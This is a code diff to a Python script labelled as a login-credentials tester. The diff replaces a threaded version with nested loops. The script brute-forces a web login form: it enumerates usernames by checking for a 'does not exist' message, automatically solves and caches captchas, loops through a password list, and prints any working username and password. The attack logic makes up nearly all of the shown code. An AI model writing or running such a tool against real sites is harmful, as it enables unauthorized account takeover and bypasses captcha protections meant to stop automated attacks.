@@ -1,7 +1,6 @@
 import argparse
 import requests
 import re
-from concurrent.futures import ThreadPoolExecutor
 import time
 
 parser = argparse.ArgumentParser(description='Test login credentials.')
@@ -38,22 +37,16 @@ def solve_captcha(response):
         captcha_cache[captcha] = solution
         return solution
 
-def check_credentials(username, password, captcha=None):
-    response = send_post(username, password, captcha)
-    captcha = solve_captcha(response)
-    if "does not exist" not in response.text:
-        for password in passwords:
-            response = send_post(username, password, captcha)
-            if "Error" not in response.text:
-                print(f"Success! Username: {username} Password: {password}")
-                return True
-            else:
-                captcha = solve_captcha(response)
-            time.sleep(1)  # Delay of 1 second between requests
-    return False
-
-with ThreadPoolExecutor(max_workers=5) as executor:
-    for username in usernames:
-        for password in passwords:
-            executor.submit(check_credentials, username, password)
-
+for username in usernames:
+    for password in passwords:
+        response = send_post(username, password)
+        captcha = solve_captcha(response)
+        if "does not exist" not in response.text:
+            for password in passwords:
+                response = send_post(username, password, captcha)
+                if "Error" not in response.text:
+                    print(f"Success! Username: {username} Password: {password}")
+                    break
+                else:
+                    captcha = solve_captcha(response)
+                time.sleep(1)  # Delay of 1 second between requests
